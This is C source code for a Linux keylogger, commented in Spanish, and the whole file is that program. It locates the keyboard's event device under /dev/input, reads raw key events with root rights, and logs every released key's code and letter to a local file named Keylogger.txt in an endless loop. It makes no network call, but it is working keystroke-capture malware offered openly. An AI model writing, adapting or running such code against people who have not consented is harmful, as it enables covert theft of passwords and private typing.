#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <dirent.h>
#include <linux/input.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/select.h>
#include <sys/time.h>
#include <termios.h>
#include <signal.h>
#include <dirent.h>

//la funcion devuelve keyboard-event-symlink
char* getKbdEvent(){

	DIR *dp;
	struct dirent *ep;
	char path[64]="/dev/input/by-path/";
	char name[64];
	static char device[128];
	int fd;

	dp = opendir (path);
	if (dp != NULL)
	{
		while (ep = readdir (dp)){
			//la liga donde esta contenida kbd es para el keyboard-input
			if(strstr(ep->d_name, "kbd") != NULL){

				//la ruta y el nombre del enlace simbólico se imprimen en el dispositivo
				sprintf(device, "%s%s", path, ep->d_name);

				//Abre el dispositivo.
				if ((fd = open (device, O_RDONLY)) == -1){
					printf ("%s no es un dispositivo valido.\n", device);
				}
				//Nombre del dispositivo
				ioctl (fd, EVIOCGNAME (sizeof (name)), name);

				//close file
				close(fd);

				printf("getKbdEvent() examina el siguiente nombre: %s\n", name);

				(void) closedir (dp);
				return device;
			}
		}
	}
	else
		perror ("No se pudo avrie el archivo.");

	return NULL;
}

char getLetter(int code){

	if (code == KEY_1) return '1';
	if (code == KEY_2) return '2';
	if (code == KEY_3) return '3';
	if (code == KEY_4) return '4';
	if (code == KEY_5) return '5';
	if (code == KEY_6) return '6';
	if (code == KEY_7) return '7';
	if (code == KEY_8) return '8';
	if (code == KEY_9) return '9';
	if (code == KEY_0) return '0';
	if (code == KEY_Q) return 'q';
	if (code == KEY_W) return 'w';
	if (code == KEY_E) return 'e';
	if (code == KEY_R) return 'r';
	if (code == KEY_T) return 't';
	if (code == KEY_Y) return 'y';
	if (code == KEY_U) return 'u';
	if (code == KEY_I) return 'i';
	if (code == KEY_O) return 'o';
	if (code == KEY_P) return 'p';
	if (code == KEY_A) return 'a';
	if (code == KEY_S) return 's';
	if (code == KEY_D) return 'd';
	if (code == KEY_F) return 'f';
	if (code == KEY_G) return 'g';
	if (code == KEY_H) return 'h';
	if (code == KEY_J) return 'j';
	if (code == KEY_K) return 'k';
	if (code == KEY_L) return 'l';
	if (code == KEY_X) return 'x';
	if (code == KEY_C) return 'c';
	if (code == KEY_V) return 'v';
	if (code == KEY_B) return 'b';
	if (code == KEY_N) return 'n';
	if (code == KEY_M) return 'm';


	return '-';

}

int main (int argc, char *argv[])
{
	FILE* fichero;
	struct input_event ev;
	int fd, rd, value, size = sizeof (struct input_event);
	char name[256] = "Unknown";
	char *device = NULL;

	printf("Bienvenido a Keylogger.\n");

	fichero = fopen("Keylogger.txt", "wt");
	if ((getuid ()) != 0)
		printf ("No eres usario root! Intenta correr el programa con sudo...\n");

	//Determinar el dispositivo del teclado
	device=getKbdEvent();

	if(device==NULL){
		return -1;
	}

	//Abre dispositivo.
	if ((fd = open (device, O_RDONLY)) == -1){
		printf ("%s no es un dispositivo valido.\n", device);
		return -1;
	}

	//Imprime el nombre del dispositivo
	ioctl (fd, EVIOCGNAME (sizeof (name)), name);
	printf ("Leyendo desde... : %s (%s)\n", device, name);

	while (1){

		memset((void*) &ev, 0, sizeof(ev));

		if ((rd = read (fd, (void*) &ev, sizeof(ev))) < size)
			printf("Error, tamaño muy pequeño\n");

		//type == 1 muestra que es EV_KEY (Key-Event) y value == 0 muestra que es una keyReleaseEvents
		if(ev.type == 1 && ev.value == 0){

			fprintf (fichero,"Tipo: %d, Codigo: %d, valor: %d, rd: %d\n", ev.type, ev.code, ev.value, rd);

			fprintf(fichero,"%c\n", getLetter(ev.code));

		}



	}

	return 0;
}
